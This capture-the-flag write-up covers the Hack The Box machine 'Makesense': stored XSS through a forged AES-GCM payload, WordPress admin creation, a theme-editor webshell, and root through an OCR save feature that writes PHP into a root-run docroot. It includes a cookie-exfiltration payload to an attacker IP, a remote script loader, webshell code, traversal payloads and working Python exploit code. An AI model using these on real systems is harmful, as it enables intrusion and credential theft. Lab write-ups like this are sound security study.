# 🖥️ Makesense

<div class="grid cards" markdown>

- :material-information-outline: &nbsp; **Machine Info**

    ---

  - 💻 **OS:** Linux (WordPress 7.0 · Apache 2.4.58 · SQLite)
  - ⚡ **Difficulty:** 🟡 Medium
  - 🎯 **Target:** `makesense.htb` (10.129.28.208)
  - 🔗 **Link:** [Makesense](https://www.hackthebox.com/machines/makesense)

- :material-tools: &nbsp; **Tools Used**

    ---

  - `nmap` — Reconnaissance & port scanning
  - `curl` — HTTP requests & endpoint testing
  - `python3` (`requests`, `pycryptodome`, `paramiko`, `Pillow`) — Payload forging, AES-GCM, SSH & OCR image rendering
  - WordPress admin panel — Theme File Editor webshell

</div>

!!! tip "Topics Covered"
    - Stored XSS via a forged AES-256-GCM payload (hardcoded client-side key)
    - WordPress admin user creation through XSS + same-origin XHR
    - Theme File Editor webshell for RCE as `www-data`
    - Password reuse: `wp-config.php` DB creds → SSH as `walter`
    - Root via arbitrary PHP file write into a root-owned PHP dev server docroot (OCR "save output")

## Description

Makesense is a Linux HTB machine running WordPress 7.0 with a custom "webagency" theme that
includes client‑side voice‑transcription (Whisper.cpp via Transformers.js). The transcription
is encrypted with a **hardcoded AES‑256‑GCM key** (`bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI`)
before being sent to the server. A **stored XSS** vulnerability exists in the
`save_voice_results` AJAX endpoint: the decrypted transcription/summary fields are rendered
without sanitisation in the WordPress admin panel, which an admin bot visits periodically.
The XSS is used to **create a new WordPress admin user**, granting access to the admin
dashboard → webshell → RCE.

---

## Recon / Enumeration

```bash
# Port scan (full)
nmap -sV -sC -p- --min-rate 2000 -oN nmap/allports.txt 10.129.28.208

# Results:
# 22/tcp   open     ssh        OpenSSH 9.6p1
# 80/tcp   filtered http
# 443/tcp  open     https      Apache 2.4.58, WordPress 7.0
# 8001/tcp filtered vcom-tunnel
```

- Domain `makesense.htb` (found in SSL cert).
- WordPress 7.0 with custom **webagency** theme.
- Custom REST endpoint: `/wp-abilities/v1/abilities` (returns 401 without proper auth).
- Admin user: `admin` (found via `/wp/v2/users`), URL: `http://localhost:8000`.
- Ports 80 and 8001 are **filtered externally** — likely internal services.
- XMLRPC fully enabled.

### Key observation: hardcoded encryption key

In `whisper-wrapper.js`:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

### WordPress AJAX endpoints (webagency theme)

| Method | Action | Purpose |
|--------|--------|---------|
| POST | `submit_contact_form` | Create a contact submission post |
| POST | `save_voice_raw` | Upload raw audio blob |
| POST | `save_voice_results` | Save encrypted transcription/summary |

---

## Exploitation

### Foothold — Stored XSS via encrypted voice results

The `save_voice_results` endpoint accepts an `encrypted_payload` field containing
AES‑256‑GCM ciphertext (IV + ciphertext + tag, base64‑encoded). The key used client‑side
is hardcoded, so we can forge valid payloads without the browser.

**Flow:**

1. Get a WordPress nonce from the homepage (`webagency_ajax.nonce`).
2. Call `submit_contact_form` → returns a `post_id`.
3. Call `save_voice_results` with an encrypted payload containing `<script>`/`<img>` XSS.
4. The admin bot visits the Contact Submissions list and the XSS fires.

**Exploit script:** `scripts/solve.py`

```python
# Key functions (simplified):
KEY = sha256(b"bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI").digest()

def encrypt_payload(transcription, summary):
    data = json.dumps({"transcription": transcription, "summary": summary}).encode()
    iv = get_random_bytes(12)
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=iv)
    ct, tag = cipher.encrypt_and_digest(data)
    return base64.b64encode(iv + ct + tag).decode()
```

#### Step 1 — Cookie exfil (proving XSS works)

```bash
python3 scripts/solve.py '<img src=x onerror="new Image().src=\'http://10.10.15.205:9000/x?c=\'+document.cookie">'
```

Callback received:

```
EXFIL_GET /x?c=wp-settings-time-3=1783364610
```

The admin visits the Contact Submissions page every ~60 seconds.

#### Step 2 — Escalate XSS to admin user creation

Created an exfil+payload server `scripts/exfil_server.py` that:

1. Serves `/p.js` (the JavaScript payload).
2. Logs exfiltrated data to `loot/exfil.log`.

The JS payload (`/p.js`) performs synchronous XHR to:

- Fetch `/wp-admin/user-new.php` and extract the CSRF nonce.
- POST to `user-new.php` to create a new administrator user.

```bash
# Start the exfil server in background
nohup python3 scripts/exfil_server.py &

# Submit XSS that loads /p.js
python3 scripts/solve.py '<img src=x onerror="var s=document.createElement(\"script\");s.src=\"http://10.10.15.205:9000/p.js\";document.body.appendChild(s)">'
```

Exfil log confirms the attack worked:

| Event | Detail |
|-------|--------|
| `SERVED /p.js` | Script requested by admin browser |
| `x?u=ck&d=...` | Cookie: `wp-settings-time-3=...` |
| `x?u=len&d=45553` | user-new.php page loaded (45 KB) |
| `x?u=nonce&d=f78a041fc9` | CSRF nonce extracted |
| `x?u=cr&d=xssu9/200` | User **xssu9** created (HTTP 200) |
| `x?u=cr_body&d=...` | Redirect to users.php (success) |

Admin users created:

- `xssu9` / `XssPwn123!`
- `xssu8207` / `XssPwn123!`

#### Step 3 — Login to WordPress admin

```bash
curl -sk -c wp_cookies.txt \
  "https://makesense.htb/wp-login.php" \
  -d "log=xssu9&pwd=XssPwn123!&wp-submit=Log+In&redirect_to=/wp-admin/"
```

Confirmed admin access — the dashboard shows "Howdy, xssu9".

#### Step 4 — Login + webshell via Theme File Editor (fixed with `requests.Session`)

The earlier curl attempt failed because a freshly-created WP admin is forced through
the **"confirm admin email"** interstitial (`wp-login.php?action=confirm_admin_email`)
before `/wp-admin/` is usable — curl's manual cookie jar didn't survive that redirect
chain. Fixed with a persistent `requests.Session` in
`scripts/wp_admin.py`:

1. `POST /wp-login.php` with one of the XSS-created admin creds.
2. If redirected to `action=confirm_admin_email`, submit the confirmation form
   (`confirm_admin_email_nonce` + `correct-admin-email=Yes, the email address is correct`).
3. `GET /wp-admin/theme-editor.php?file=functions.php&theme=webagency` → scrape `nonce`
   and current `newcontent`.
4. `POST` back the same content with a webshell line appended:
   `if(isset($_GET['cmd'])){echo "SHELL:"; system($_GET['cmd']);}`

Confirmed RCE as `www-data`:

```
curl -sk "https://makesense.htb/?cmd=id"
# SHELL:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ongoing shell interaction via `scripts/shell.py` (`python3 scripts/shell.py "<cmd>"`).

Note: the admin bot re-visits the stored-XSS Contact Submissions page every ~60s and the
payload re-fires **every visit**, creating a new admin user each time — 36 admin accounts
had accumulated by the time this was noticed. The exfil listener (`scripts/exfil_server.py`)
was killed once RCE was confirmed to stop further spam.

#### Step 5 — Credentials in wp-config.php → SSH as walter

```
python3 scripts/shell.py "cat /var/www/html/wp-config.php"
```

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

WordPress runs on SQLite so these DB creds are unused by the app itself, but they are
**reused as the `walter` system account password** (`/etc/passwd` shows `walter:1000` and
`admin:1001`). SSH in as walter:

```
ssh walter@makesense.htb   # password: JbhHDAEgXvri3!
```

`walter` has no `sudo` rights (`sudo -l` → "may not run sudo on makesense") and is not in
any extra groups. `/home/admin` is not readable by walter.

**User flag:** `/home/walter/user.txt` → `b0d9b988398ef8ab93131175d1086459`

---

## Privilege escalation

### Internal service discovery (from walter SSH)

Port 8001 was filtered externally but is **listening on 127.0.0.1** — it's a PHP built-in
development server running as **root** (PID 1395):

```bash
# From walter's SSH session
curl -s http://walter:JbhHDAEgXvri3%21@127.0.0.1:8001/
```

The service is an **OCR drawing application** ("MakeSense") — draw on a canvas, submit via
POST (`canvas_image` as base64 PNG data URL), returns recognized text. It's protected by
**HTTP Basic Auth** — and the credentials are **reused** from wp-config.php
(`walter:JbhHDAEgXvri3!`).

```php
php -S 127.0.0.1:8001 -t /root/ocr4/
#                          ^^^^^^^^^^^— contents not readable by walter (0700 root)
```

### The `admin` user & prey automation

The box has a second user `admin` (uid 1001) that runs a Python Selenium automation script:

```bash
admin  /bin/sh -c PREY_BASE_URL=https://makesense.htb PREY_HEADLESS=true \
         /usr/bin/python3 /home/admin/.process/prey-unified.py \
         >> /home/admin/automation.log 2>&1
```

This script starts Chrome **headless** (`--headless=new --no-sandbox`) with a random
`--remote-debugging-port=0`, making the **Chrome DevTools port** and **chromedriver port**
available on 127.0.0.1 ephemerally. The script runs periodically (~every 60-120 seconds)
and its home directory (`/home/admin/`) is not readable by `walter`.

### Attack path in progress

The intended root escalation likely involves:

1. **Chrome DevTools hijack:** When `prey-unified.py` starts Chrome, ephemeral ports appear
   on lo (`127.0.0.1:XXXXX`). Via SSH port-forwarding, an attacker can connect to the
   Chrome DevTools Protocol and navigate the browser to internal services.

2. **OCR service (root) via browser:** The OCR service on port 8001 runs as root and requires
   Basic Auth as `walter`. The `admin` user's Chrome could be made (via DevTools) to POST a
   crafted image to the OCR service — exploiting a potential command injection, LFI, or
   deserialization inside `/root/ocr4/index.php` to execute code as **root**.

3. **Source code not readable:** The `/root/ocr4/` directory is mode 0700 owned by root.
   The PHP source (`index.php`) is only accessible through the built-in server.

### OCR "Save as" feature — arbitrary file write candidate

The OCR app has a **second form** after a successful recognition:

```html
<form method="post">
    <input type="hidden" name="ocr_id" value="ocr_6a4c079732df96.34471046">
    <input type="text" name="filename" placeholder="result.txt" required>
    <button type="submit" name="save_output">Save</button>
</form>
```

`POST /` with `ocr_id` + `filename` + `save_output=Save` writes the recognized text
server-side (as **root**, since the PHP dev server itself runs as root) and replies
`Saved as: saved/<filename>` — confirming a `saved/` subdirectory under the app root
(`/root/ocr4/saved/`).

**Session state matters:** `ocr_id` is only resolvable within the **same PHP session**
(`PHPSESSID` cookie) that generated it — a plain stateless `urllib.request` POST (no
cookie jar) silently fails to find the id. Must use `requests.Session()` (or curl `-c/-b`)
across the recognize → save round trip.

**Path traversal attempts (all neutralised so far):**

| `filename` payload | Result |
|---|---|
| `../../../../tmp/x.txt` (any depth 1–6) | saved as `saved/x.txt` — path stripped |
| `....//....//....//tmp/x.txt` | no notice / write not confirmed in `/tmp` |
| `..%2f..%2f..%2ftmp%2fx.txt` | same |
| `..\..\..\tmp\x.txt` | same |
| `/tmp/x.txt` (absolute) | same |
| `a/../../../../tmp/x.txt` | same |

Looks like `basename()` (or equivalent) is applied to `filename` before writing — classic
slash-based traversal (including `....//`, URL-encoded, and backslash variants) is fully
neutralized: every payload saved as `saved/<basename-only>`. Directory traversal was a
dead end.

Also tried: injecting a fake MIME `name=` parameter into the `canvas_image` data URI
(`data:image/png;name=x\`cmd\`.png;base64,...`) to see if the server shells out to an
external OCR binary with an attacker-controlled temp filename — rejected outright
(`Invalid image data.`). The data-URL parser only accepts a strict
`data:image/(png|jpeg);base64,<payload>`shape with real decodable image bytes; other
MIME types (`svg+xml`,`gif`,`webp`,`bmp`,`pdf`,`tiff`) were also rejected.

### Root — the "Save as" feature writes straight into the OCR app's own webroot

The key realization: `php -S 127.0.0.1:8001 -t /root/ocr4/` serves **`/root/ocr4/` itself**
as the HTTP document root, and `saved/` (where recognized output gets written) is a
subdirectory *inside* that same docroot. Traversal wasn't needed at all — a file saved as
`saved/<name>.php` is immediately reachable at `http://127.0.0.1:8001/saved/<name>.php`
and PHP's built-in server **executes it**, running as **root**.

The only requirement is that the OCR engine "read back" our PHP payload as text accurately
enough to reproduce it byte-for-byte. Instead of hand-drawing on the canvas, a clean PNG
of the payload was rendered with PIL/Pillow (bold monospace font) and submitted directly
as the `canvas_image` data URL — the OCR engine transcribed it perfectly:

```python
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (900, 200), 'white')
d = ImageDraw.Draw(img)
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 36)
d.text((20, 70), '<?php system($_GET["c"]); ?>', fill='black', font=font)
img.save('shell_render.png')
```

Full chain (recognize → save as `.php` → hit it), all within one `requests.Session` so the
`PHPSESSID`-bound `ocr_id` stays valid:

```python
import requests, base64, re
s = requests.Session(); s.auth = ('walter', 'JbhHDAEgXvri3!')
BASE = 'http://127.0.0.1:8001/'

b64 = base64.b64encode(open('shell_render.png', 'rb').read()).decode()
r = s.post(BASE, data={'canvas_image': 'data:image/png;base64,' + b64})
ocr_id = re.search(r'name="ocr_id" value="([^"]*)"', r.text).group(1)

s.post(BASE, data={'ocr_id': ocr_id, 'filename': 'shell.php', 'save_output': 'Save'})

r3 = s.get(BASE + 'saved/shell.php', params={'c': 'id'})
print(r3.text)   # uid=0(root) gid=0(root) groups=0(root)
```

Confirmed:

```
$ curl -s -u "walter:JbhHDAEgXvri3!" "http://127.0.0.1:8001/saved/shell.php?c=id"
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**

```
curl -s -u "walter:JbhHDAEgXvri3!" "http://127.0.0.1:8001/saved/shell.php" --data-urlencode "c=cat /root/root.txt" -G
# 1ba34db31b170bb0a085d541b508a4c0
```

The Chrome DevTools / `prey-unified.py` avenue documented above was a red herring for
privesc — it's just the site's admin QA bot (its `login-failure.png` screenshot in `/tmp`,
world-readable, shows it stuck on WordPress's "confirm admin email" screen, the same
interstitial worked around in Step 4).

---

## Flag

| Flag | Value | Status |
|------|-------|--------|
| **user** | `b0d9b988398ef8ab93131175d1086459` | ✅ |
| **root** | `1ba34db31b170bb0a085d541b508a4c0` | ✅ |

---

## Vulnerability

**Foothold**

- **Type:** Stored Cross-Site Scripting (XSS)
- **CWE:** CWE-79
- **OWASP:** A03:2021 (Injection)

**Privilege escalation**

- **Type:** Arbitrary PHP file write inside a web-accessible directory served by root's
  PHP built-in dev server (OCR "save output" feature writes into its own docroot)
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type) / CWE-94 (Code Injection)
- **OWASP:** A03:2021 (Injection)

## Mitigation

- Encrypt then MAC (AES‑GCM is correct), but the key is **hardcoded in client‑side JS**.
  The key should be per‑session or per‑user, never static.
- The decrypted transcription/summary must be HTML‑escaped before rendering in the admin
  panel (`htmlspecialchars` / `esc_html`).
- WordPress admin session cookies should have `HttpOnly` flag (they do not appear in JS
  exfil, confirming they are HttpOnly — the create‑user attack worked via same‑origin XHR).
- Never run `php -S` (or any dev server) as **root**, and never let a user-controlled
  "save output" feature write into the same directory tree the server executes PHP from —
  separate the writable/output directory from the docroot, whitelist output extensions
  (e.g. `.txt` only), and don't trust `basename()` alone as the *only* safeguard when the
  real risk is arbitrary *code* execution rather than path traversal.
- Reused passwords (`wp-config.php` DB creds == `walter`'s system password == OCR app's
  Basic Auth) let a single leak cascade across three otherwise-unrelated services —
  use distinct credentials per service.

---

## Timeline

```
[1] nmap → [2] WordPress recon → [3] JS source analysis (encryption key) →
[4] solve.py (AES-GCM forge) → [5] XSS cookie exfil → [6] /p.js user creation payload →
[7] WordPress admin access → [8] theme-editor webshell injection (RCE as www-data) →
[9] wp-config.php DB creds → SSH as walter (pw reuse, user flag) →
[10] Internal service discovery (OCR on :8001 running as root, Basic Auth = walter's pw) →
[11] Path-traversal fuzzing on "save output" filename → dead end (basename() holds) →
[12] Realized saved/ is inside the OCR app's own docroot → OCR-render a PHP payload as an
     image, let OCR "read" it back, save as saved/shell.php → RCE as root → root flag
```

## Tools used

- `nmap` 7.99
- `curl`
- Python 3 + `requests` + `pycryptodome` (AES-GCM) + `paramiko` (SSH) + `Pillow` (PIL, for
  rendering the OCR payload image)
- WordPress admin panel
